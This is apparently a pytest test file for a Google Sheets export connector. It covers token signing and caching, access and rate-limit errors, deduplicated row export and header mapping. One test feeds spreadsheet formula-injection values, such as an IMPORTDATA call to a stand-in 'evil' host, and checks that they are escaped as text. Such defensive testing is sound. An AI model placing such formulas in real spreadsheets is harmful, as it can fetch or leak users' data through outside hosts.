"""Google Таблицы: токен сервисного аккаунта, проверка, выгрузка без дублей, ошибки доступа и лимитов."""

import json
import re
import uuid
from collections import defaultdict
from datetime import UTC, datetime
from urllib.parse import parse_qs

import httpx
import jwt
import pytest
import respx
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from docflow.connectors import google_sheets
from docflow.connectors.base import REGISTRY, ConnectorError, DestCtx, ExportDoc
from docflow.labels import apply_labels
from docflow.schemas.library import builtin_schemas
from docflow.tabular import docs_header, items_header

SHEET = "SID123"
API = f"https://sheets.googleapis.com/v4/spreadsheets/{SHEET}"
TOKEN_URL = "https://oauth2.googleapis.com/token"
EMAIL = "bot@proj.iam.gserviceaccount.com"
DOCS = "Документы"
ITEMS = "Позиции"

_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PRIVATE_PEM = _KEY.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()
).decode()
PUBLIC_PEM = _KEY.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
)


def sa_json(email=EMAIL) -> str:
    return json.dumps({"client_email": email, "private_key": PRIVATE_PEM, "token_uri": TOKEN_URL})


@pytest.fixture(autouse=True)
def _clean_tokens():
    google_sheets.TOKENS.clear()


@pytest.fixture
async def http():
    async with httpx.AsyncClient() as client:
        yield client


def make_ctx(http, mapping=None, **config) -> DestCtx:
    return DestCtx(
        config={"spreadsheet_id": SHEET, **config},
        secrets={"service_account_json": sa_json()},
        mapping=mapping or {},
        http=http,
    )


def make_doc(**data) -> ExportDoc:
    schema = builtin_schemas()["invoice_ru"]
    return ExportDoc(
        id=uuid.UUID("11111111-1111-1111-1111-111111111111"),
        tenant_id=uuid.uuid4(),
        schema=schema,
        data={
            "number": "42",
            "issued": "2026-10-05",
            "supplier": "ООО Ромашка",
            "total": 1250.5,
            "vat": 250,
            "items": [
                {"name": "Болт", "qty": 2, "unit": "шт", "price": 100, "amount": 200},
                {"name": "Гайка", "qty": 1, "unit": "шт", "price": 50.5, "amount": 50.5},
            ],
            **data,
        },
        status="ok",
        created_at=datetime(2026, 10, 5, tzinfo=UTC),
        title=schema.title,
        number="42",
        issued=datetime(2026, 10, 5).date(),
        cabinet_url="https://site/app/documents/1",
        digital_pdf_url="https://site/app/files/1/digital",
    )


def mock_token(router, expires_in=3600):
    return router.post(TOKEN_URL).respond(json={"access_token": "tok-1", "expires_in": expires_in})


def meta(*titles):
    return {
        "properties": {"title": "Реестр"},
        "sheets": [{"properties": {"title": t, "sheetId": i + 1}} for i, t in enumerate(titles)],
    }


class Sheet:
    """Минимальная имитация Sheets API поверх respx: хранит значения, считает записи."""

    def __init__(self, router, titles=(DOCS, ITEMS), docs_col=None, items_col=None):
        self.cells = defaultdict(list)
        self.cells[DOCS] = [list(r) for r in (docs_col or [])]
        self.cells[ITEMS] = [list(r) for r in (items_col or [])]
        self.titles = list(titles)
        self.appends: list[tuple[str, list]] = []
        self.puts: list[tuple[str, list]] = []
        self.created: list[str] = []
        self.formats: list[dict] = []
        self.props: list[dict] = []
        self.fail_append: list[str] = []  # листы, чья следующая запись строк ответит 503
        router.get(API).mock(side_effect=lambda req: httpx.Response(200, json=meta(*self.titles)))
        router.post(f"{API}:batchUpdate").mock(side_effect=self._batch)
        router.get(url__regex=rf"{API}/values/.*").mock(side_effect=self._read)
        router.post(url__regex=rf"{API}/values/.*:append.*").mock(side_effect=self._append)
        router.put(url__regex=rf"{API}/values/.*").mock(side_effect=self._put)

    @staticmethod
    def _sheet_of(path: str) -> str:
        from urllib.parse import unquote

        rng = unquote(path.split("/values/")[1].split(":append")[0])
        title = rng.rsplit("!", 1)[0]
        return title[1:-1].replace("''", "'") if title.startswith("'") else title

    def _batch(self, req):
        for r in json.loads(req.content)["requests"]:
            if "repeatCell" in r:
                self.formats.append(r["repeatCell"])
                continue
            if "updateSpreadsheetProperties" in r:
                self.props.append(r["updateSpreadsheetProperties"])
                continue
            title = r["addSheet"]["properties"]["title"]
            self.titles.append(title)
            self.created.append(title)
        return httpx.Response(200, json={})

    def _read(self, req):
        from urllib.parse import unquote

        raw = unquote(req.url.path.split("/values/")[1])
        sheet = self._sheet_of(req.url.raw_path.decode())
        rows = self.cells[sheet]
        col = re.search(r"!([A-Z]+):\1$", raw)
        if col:  # колонка «X:X»
            i = 0
            for ch in col.group(1):  # A=0 … Z=25, AA=26
                i = i * 26 + ord(ch) - ord("A") + 1
            i -= 1
            shown = [[str(r[i]).removeprefix("'")] if len(r) > i else [] for r in rows]  # Таблицы не показывают «'»
            while shown and not shown[-1]:
                shown.pop()
            return httpx.Response(200, json={"values": shown} if shown else {})
        assert raw.endswith("!1:1"), raw
        return httpx.Response(200, json={"values": rows[:1]} if rows else {})

    def _append(self, req):
        sheet = self._sheet_of(req.url.raw_path.decode())
        if sheet in self.fail_append:
            self.fail_append.remove(sheet)
            return httpx.Response(503)
        values = json.loads(req.content)["values"]
        start = len(self.cells[sheet]) + 1
        self.cells[sheet].extend(values)
        self.appends.append((sheet, values))
        last = start + len(values) - 1
        return httpx.Response(200, json={"updates": {"updatedRange": f"'{sheet}'!A{start}:K{last}"}})

    def _put(self, req):
        sheet = self._sheet_of(req.url.raw_path.decode())
        values = json.loads(req.content)["values"]
        self.cells[sheet][:1] = values[:1]
        self.puts.append((sheet, values))
        return httpx.Response(200, json={})


async def test_token_is_signed_rs256_and_cached(http):
    with respx.mock(assert_all_called=False) as router:
        route = mock_token(router)
        Sheet(router)
        c = google_sheets.GoogleSheets()
        await c.test(make_ctx(http))
        await c.test(make_ctx(http))
    assert route.call_count == 1  # кэш до истечения
    body = parse_qs(route.calls[0].request.content.decode())
    assert body["grant_type"] == ["urn:ietf:params:oauth:grant-type:jwt-bearer"]
    claims = jwt.decode(body["assertion"][0], PUBLIC_PEM, algorithms=["RS256"], audience=TOKEN_URL)
    assert claims["iss"] == EMAIL
    assert claims["scope"] == "https://www.googleapis.com/auth/spreadsheets"


async def test_token_refreshed_when_near_expiry(http):
    with respx.mock(assert_all_called=False) as router:
        route = mock_token(router, expires_in=30)  # < 60 с запаса: каждый раз новый
        Sheet(router)
        c = google_sheets.GoogleSheets()
        await c.test(make_ctx(http))
        await c.test(make_ctx(http))
    assert route.call_count == 4  # по токену на каждый запрос: метаданные и проверка записи, дважды


async def test_test_ok_and_url_id_extraction(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        Sheet(router)
        msg = await google_sheets.GoogleSheets().test(
            make_ctx(http, spreadsheet_id=f"https://docs.google.com/spreadsheets/d/{SHEET}/edit#gid=0")
        )
    assert msg == "Таблица «Реестр» доступна для записи"


async def test_test_rejects_bad_service_account(http):
    ctx = make_ctx(http)
    ctx.secrets["service_account_json"] = json.dumps({"client_email": EMAIL})
    with pytest.raises(ConnectorError) as e:
        await google_sheets.GoogleSheets().test(ctx)
    assert not e.value.retryable and "private_key" in e.value.message
    ctx.secrets["service_account_json"] = "не json"
    with pytest.raises(ConnectorError):
        await google_sheets.GoogleSheets().test(ctx)


@pytest.mark.parametrize("code", [403, 404])
async def test_no_access_not_retryable_names_email(http, code):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        router.get(API).respond(code, json={"error": {"message": "x"}})
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert not e.value.retryable
    assert e.value.message == (
        "нет доступа к таблице или выключен Google Sheets API — откройте доступ на редактирование "
        f"для {EMAIL} и проверьте, что API включён"
    )


@pytest.mark.parametrize("code", [429, 500, 503])
async def test_rate_limit_and_5xx_retryable(http, code):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        router.get(API).respond(code)
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert e.value.retryable


async def test_timeout_retryable(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        router.get(API).mock(side_effect=httpx.ReadTimeout("t"))
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert e.value.retryable


async def test_token_rejection_not_retryable(http):
    with respx.mock(assert_all_called=False) as router:
        router.post(TOKEN_URL).respond(400, json={"error": "invalid_grant"})
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert not e.value.retryable and "ключ" in e.value.message


async def test_first_export_creates_sheets_headers_and_rows(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, titles=["Лист1"])
        ext = await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
        urls = [str(c.request.url) for c in router.calls if c.request.url.path.endswith(":append")]
    assert sheet.created == [DOCS, ITEMS]
    docs = sheet.cells[DOCS]
    assert docs[0][:4] == ["ID документа", "Тип", "Номер", "Дата"]
    assert docs[0][-3:] == ["Статус", "Цифровая версия (PDF)", "Кабинет"]
    row = docs[1]
    assert row[0] == "'11111111-1111-1111-1111-111111111111"  # цифры и дефисы Таблицы разобрали бы сами
    assert row[2] == "'42"  # номер — текст, а не число
    assert row[3] == 46300  # 05.10.2026 серийным числом
    assert {f["range"]["startColumnIndex"] for f in sheet.formats} >= {3, 5}  # колонки с датами получили формат
    assert all(f["cell"]["userEnteredFormat"]["numberFormat"]["pattern"] == "dd.mm.yyyy" for f in sheet.formats)
    assert 1250.5 in row and 250 in row  # числа числами
    assert None in row or "" in row  # отсутствующее поле — пусто
    items = sheet.cells[ITEMS]
    assert items[0][:2] == ["ID документа", "Номер"]
    assert [r[2:4] for r in items[1:]] == [["Болт", 2], ["Гайка", 1]]
    assert ext == f"{DOCS}!A2"
    # USER_ENTERED и INSERT_ROWS
    assert len(urls) == 2 and all(
        "valueInputOption=USER_ENTERED" in u and "insertDataOption=INSERT_ROWS" in u for u in urls
    )


async def test_repeat_export_does_not_duplicate(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        c = google_sheets.GoogleSheets()
        first = await c.export(make_ctx(http), make_doc())
        before = {k: len(v) for k, v in sheet.cells.items()}
        again = await c.export(make_ctx(http), make_doc())
    assert again == first == f"{DOCS}!A2"
    assert {k: len(v) for k, v in sheet.cells.items()} == before


async def test_retry_after_items_failure_adds_only_missing_items(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        doc = make_doc()
        sheet.cells[DOCS] = [["ID документа"], [str(doc.id)]]  # документ записан, позиций нет
        await google_sheets.GoogleSheets().export(make_ctx(http), doc)
    assert len(sheet.cells[DOCS]) == 2
    assert len(sheet.cells[ITEMS]) == 3  # заголовок + 2 позиции


async def test_mapping_picks_and_renames_columns(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(
            make_ctx(http, mapping={"supplier": "Контрагент", "total": "Сумма"}), make_doc()
        )
    header = sheet.cells[DOCS][0]
    assert header[4:6] == ["Контрагент", "Сумма"] and len(header) == 4 + 2 + 3
    assert sheet.cells[DOCS][1][4:6] == ["ООО Ромашка", 1250.5]


async def test_custom_sheet_names_and_quoting(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, titles=["Мои 'док'", "Поз"])
        ext = await google_sheets.GoogleSheets().export(
            make_ctx(http, documents_sheet="Мои 'док'", items_sheet="Поз"), make_doc()
        )
    assert ext == "Мои 'док'!A2"
    assert len(sheet.cells["Мои 'док'"]) == 2 and len(sheet.cells["Поз"]) == 3


async def test_document_without_items_writes_only_document(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(items=None, supplier=None))
    assert len(sheet.cells[DOCS]) == 2 and sheet.cells[ITEMS] == []


async def test_export_no_access_message(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        router.get(API).respond(403)
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
    assert not e.value.retryable and EMAIL in e.value.message


def test_registered():
    assert REGISTRY["google_sheets"].kind == "google_sheets"
    c = REGISTRY["google_sheets"]
    assert {f.name for f in c.secret_fields} == {"service_account_json"}
    assert {f.name for f in c.config_fields} == {"spreadsheet_id", "documents_sheet", "items_sheet"}


async def test_formulas_and_identifiers_sent_as_text(http):
    evil = {
        "supplier": '=IMPORTDATA("http://evil")',
        "buyer": "@SUM(1)",
        "supplier_inn": "0012345678",
        "account": "40702810900000000001",
        "supplier_kpp": "+7 999",
        "bik": "-5",
        "corr_account": "	=1+1",
        "total": 10,
    }
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(**evil, items=[{"name": "=HYPERLINK(1)"}]))
    row = dict(zip(sheet.cells[DOCS][0], sheet.cells[DOCS][1], strict=True))
    assert row["Поставщик"] == "'=IMPORTDATA(\"http://evil\")"
    assert row["Покупатель"] == "'@SUM(1)"
    assert row["ИНН поставщика"] == "'0012345678"
    assert row["Расчётный счёт поставщика"] == "'40702810900000000001"
    assert row["КПП поставщика"] == "'+7 999" and row["БИК банка поставщика"] == "'-5"
    assert row["Корр. счёт банка"] == "'=1+1"  # табуляция вырезана, формула экранирована
    assert row["Всего к оплате"] == 10
    assert sheet.cells[ITEMS][1][2] == "'=HYPERLINK(1)"


async def test_sheet_name_is_percent_encoded_in_url(http):
    name = "а?#/%б"
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, titles=[name, "Поз"])
        await google_sheets.GoogleSheets().export(make_ctx(http, documents_sheet=name, items_sheet="Поз"), make_doc())
        paths = [c.request.url.raw_path.decode() for c in router.calls if "/values/" in c.request.url.path]
    assert len(sheet.cells[name]) == 2
    assert all("?#" not in p.split("/values/")[1] and "%3F%23%2F%25" in p for p in paths if "values/%27" in p)


async def test_malformed_token_response(http):
    with respx.mock(assert_all_called=False) as router:
        router.post(TOKEN_URL).respond(200, json={"expires_in": 3600})
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert "непонятный" in e.value.message
    with respx.mock(assert_all_called=False) as router:
        router.post(TOKEN_URL).respond(200, text="<html>")
        with pytest.raises(ConnectorError):
            await google_sheets.GoogleSheets().test(make_ctx(http))


async def test_same_sheet_names_rejected(http):
    with pytest.raises(ConnectorError) as e:
        await google_sheets.GoogleSheets().test(make_ctx(http, documents_sheet="Лист", items_sheet="лист"))
    assert not e.value.retryable


async def test_date_format_applied_when_header_already_exists(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["Мои заголовки", "Дата"]], items_col=[["ID документа", "Наименование"]])
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
    assert not sheet.puts  # чужую шапку не трогаем
    assert {f["range"]["startColumnIndex"] for f in sheet.formats if f["range"]["sheetId"] == 1} == {1}
    assert sheet.cells[DOCS][1] == ["", 46300]
    assert sheet.cells[ITEMS][1:] == [
        ["'11111111-1111-1111-1111-111111111111", "Болт"],
        ["'11111111-1111-1111-1111-111111111111", "Гайка"],
    ]


async def test_column_a_lookup_uses_formatted_values(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
        urls = [str(c.request.url) for c in router.calls if c.request.method == "GET"]
        reads = [u for u in urls if "A%3AA" in u]
    assert reads and all("valueRenderOption=FORMATTED_VALUE" in u for u in reads)


async def test_sheet_titles_compared_case_insensitively(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, titles=["документы", "позиции"])
        sheet.cells["документы"] = []
        await google_sheets.GoogleSheets().export(
            make_ctx(http, documents_sheet="Документы", items_sheet="Позиции"), make_doc()
        )
    assert sheet.created == []


async def test_test_checks_write_access_with_same_title(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().test(make_ctx(http))
    # запись права на редактирование — то же название таблицы, ничего видимого не меняется
    assert sheet.props == [{"properties": {"title": "Реестр"}, "fields": "title"}]
    assert not sheet.appends and not sheet.puts and not sheet.created


async def test_test_read_only_share_fails_with_hint(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        router.get(API).respond(json=meta(DOCS))
        denied = {"error": {"message": "The caller does not have permission"}}
        router.post(f"{API}:batchUpdate").respond(403, json=denied)
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().test(make_ctx(http))
    assert not e.value.retryable
    assert e.value.message == f"у сервисного аккаунта только чтение — откройте доступ на редактирование для {EMAIL}"


async def test_other_schema_header_rejected_not_retryable(http):
    act = builtin_schemas()["upd_ru"]
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())  # шапка счёта
        other = make_doc()
        other.id = uuid.UUID("22222222-2222-2222-2222-222222222222")
        other.schema, other.title = act, act.title
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), other)
    assert not e.value.retryable
    assert e.value.message == (
        "в этой таблице уже другие колонки — для другого типа документа заведите отдельное подключение или другой лист"
    )
    assert len(sheet.cells[DOCS]) == 2  # строка УПД со сдвигом колонок не записана


async def test_same_schema_header_accepted_on_next_document(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
        second = make_doc()
        second.id = uuid.UUID("33333333-3333-3333-3333-333333333333")
        await google_sheets.GoogleSheets().export(make_ctx(http), second)
    assert len(sheet.cells[DOCS]) == 3 and len(sheet.puts) == 2  # шапки записаны один раз


async def test_our_header_renamed_fields_rewritten(http):
    base = builtin_schemas()["invoice_ru"]
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(items=None))
        second = make_doc(items=None)
        second.id = uuid.UUID("33333333-3333-3333-3333-333333333333")
        second.schema, second.base_schema = apply_labels(base, {"vat": "Налог"}), base
        await google_sheets.GoogleSheets().export(make_ctx(http), second)
    header = sheet.cells[DOCS][0]
    assert len(sheet.puts) == 2 and "Налог" in header and "НДС" not in header
    assert header == docs_header(second.schema)
    assert len(sheet.cells[DOCS]) == 3
    assert sheet.cells[DOCS][2][header.index("Налог")] == 250


async def test_our_header_not_rewritten_over_other_document_type(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(items=None))
        other = make_doc(items=None)
        other.id = uuid.UUID("33333333-3333-3333-3333-333333333333")
        other.title = "Другой документ"  # та же длина шапки, но смысл колонок другой
        other.schema = apply_labels(other.schema, {"vat": "Налог"})
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), other)
    assert not e.value.retryable and e.value.message == google_sheets.OTHER_COLUMNS
    assert len(sheet.puts) == 1 and len(sheet.cells[DOCS]) == 2


async def test_client_header_row_aligned_by_names(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["Поставщик", "ID документа", "Сумма"]])
        ext = await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(items=None))
    assert sheet.appends == [(DOCS, [["ООО Ромашка", "'11111111-1111-1111-1111-111111111111", ""]])]
    assert sheet.puts == []
    assert ext == f"{DOCS}!A2"


async def test_client_header_dedupe_by_id_column(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["Поставщик", "ID документа", "Сумма"]])
        c = google_sheets.GoogleSheets()
        first = await c.export(make_ctx(http), make_doc())
        before = {k: len(v) for k, v in sheet.cells.items()}
        again = await c.export(make_ctx(http), make_doc())
    assert again == first == f"{DOCS}!A2"
    assert {k: len(v) for k, v in sheet.cells.items()} == before


async def test_client_items_without_id_written_before_doc_row(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, items_col=[["Наименование", "Цена"]])
        c = google_sheets.GoogleSheets()
        await c.export(make_ctx(http), make_doc())
        before = {k: len(v) for k, v in sheet.cells.items()}
        await c.export(make_ctx(http), make_doc())
    assert [name for name, _ in sheet.appends] == [ITEMS, DOCS]  # позиции — раньше строки документа
    assert sheet.cells[ITEMS][1:] == [["Болт", 100], ["Гайка", 50.5]]
    # повтор: строка документа есть — значит, и позиции записаны; ничего не дописываем
    assert {k: len(v) for k, v in sheet.cells.items()} == before


async def test_client_items_without_id_retry_after_doc_failure_duplicates_not_loses(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, items_col=[["Наименование", "Цена"]])
        sheet.fail_append.append(DOCS)
        c = google_sheets.GoogleSheets()
        with pytest.raises(ConnectorError) as e:
            await c.export(make_ctx(http), make_doc())
        assert e.value.retryable
        await c.export(make_ctx(http), make_doc())
    assert len(sheet.cells[DOCS]) == 2  # строка документа записана со второй попытки
    # позиции без колонки ID не опознать: при повторе они видны дважды, но не потеряны
    assert [r[0] for r in sheet.cells[ITEMS][1:]] == ["Болт", "Гайка", "Болт", "Гайка"]


async def test_client_items_with_id_column_dedupe(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, items_col=[["Наименование", "ID документа"]])
        c = google_sheets.GoogleSheets()
        await c.export(make_ctx(http), make_doc())
        sheet.cells[DOCS] = sheet.cells[DOCS][:1]  # строку документа удалили: позиции уже есть
        await c.export(make_ctx(http), make_doc())
    assert sheet.cells[ITEMS][1:] == [
        ["Болт", "'11111111-1111-1111-1111-111111111111"],
        ["Гайка", "'11111111-1111-1111-1111-111111111111"],
    ]
    assert len(sheet.cells[DOCS]) == 2


async def test_items_without_known_columns_fail_before_any_write(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, items_col=[["Мусор"]])
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
    assert e.value.message == google_sheets.NO_KNOWN_COLUMNS and not e.value.retryable
    assert sheet.appends == [] and sheet.puts == []


async def test_blank_a1_with_client_names_is_client_header(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["", "Поставщик", "Номер"]])
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc(items=None))
    assert sheet.puts == []  # нашу шапку поверх названий клиента не пишем
    assert sheet.appends == [(DOCS, [["", "ООО Ромашка", "'42"]])]


async def test_id_column_beyond_z(http):
    header = [f"Колонка {i}" for i in range(27)] + ["ID документа", "Поставщик"]
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[header])
        c = google_sheets.GoogleSheets()
        await c.export(make_ctx(http), make_doc(items=None))
        await c.export(make_ctx(http), make_doc(items=None))
        reads = [str(call.request.url) for call in router.calls if "AB%3AAB" in str(call.request.url)]
    assert len(reads) == 2 and len(sheet.appends) == 1
    assert sheet.cells[DOCS][1][27:] == ["'11111111-1111-1111-1111-111111111111", "ООО Ромашка"]


def test_column_letter():
    assert [google_sheets.column_letter(i) for i in (0, 25, 26, 27, 701, 702)] == ["A", "Z", "AA", "AB", "ZZ", "AAA"]


async def test_our_items_header_renamed_rewritten(http):
    base = builtin_schemas()["invoice_ru"]
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router)
        await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
        second = make_doc()
        second.id = uuid.UUID("33333333-3333-3333-3333-333333333333")
        second.schema, second.base_schema = apply_labels(base, {"items.qty": "Штук"}), base
        await google_sheets.GoogleSheets().export(make_ctx(http), second)
    assert len(sheet.puts) == 3 and sheet.puts[-1][0] == ITEMS  # шапка документов не менялась
    assert "Штук" in sheet.cells[ITEMS][0] and len(sheet.cells[ITEMS]) == 5


async def test_our_items_header_not_rewritten_when_docs_header_is_clients(http):
    base = builtin_schemas()["invoice_ru"]
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["Поставщик", "ID документа"]], items_col=[items_header(base)])
        doc = make_doc()
        doc.schema, doc.base_schema = apply_labels(base, {"items.qty": "Штук"}), base
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), doc)
    # без нашего листа документов не проверить тип: подписи могли бы лечь на позиции другого типа
    assert e.value.message == google_sheets.OTHER_COLUMNS
    assert sheet.appends == [] and sheet.puts == []


async def test_client_header_without_known_columns_fails(http):
    with respx.mock(assert_all_called=False) as router:
        mock_token(router)
        sheet = Sheet(router, docs_col=[["Мои заголовки"]])
        with pytest.raises(ConnectorError) as e:
            await google_sheets.GoogleSheets().export(make_ctx(http), make_doc())
    assert e.value.message == google_sheets.NO_KNOWN_COLUMNS == "в таблице нет ни одной знакомой колонки"
    assert e.value.retryable is False
    assert sheet.appends == []
